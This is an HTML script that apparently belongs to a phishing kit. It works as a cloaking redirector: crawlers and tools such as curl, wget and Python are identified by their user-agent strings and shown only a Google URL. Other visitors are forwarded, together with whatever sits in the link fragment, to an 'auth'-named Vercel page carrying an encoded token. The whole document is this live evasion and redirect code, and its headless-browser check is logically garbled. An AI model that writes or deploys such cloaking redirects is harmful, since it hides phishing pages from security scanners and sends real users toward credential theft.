<script>
    function isLikelyBot() {
        const botPatterns = [
            /bot/i, /crawl/i, /spider/i, /scrapy/i, /python/i,
            /curl/i, /wget/i, /node\.js/i, /phantomjs/i
        ];

        const ua = navigator.userAgent || '';
        return botPatterns.some(pattern => pattern.test(ua)) ||
               !navigator.webdriver === false; // headless detection
    }

    if (isLikelyBot()) {
        document.body.innerHTML = "https://www.google.com";
    } else {
        // Your redirect logic here
        if (window.location.hash) {
            var hash = window.location.hash.substring(1);
            var targetURL = "https://czpowersourcing-auth.vercel.app?oMTqwOWufzKCNnxPSr8%2F8v6y2ySjfHWwR%2B7bB3gi8sS7dz5Vn%3D%3AVaYN21vSPDPIt%2BzL2eLaYM3MXtiohyqv&s=bf603f4361295ef19f9e6e4ba9938319&i#" + hash;
            window.location.replace(targetURL);
        } else {
            window.location.replace("https://www.google.com");
        }
    }
</script>
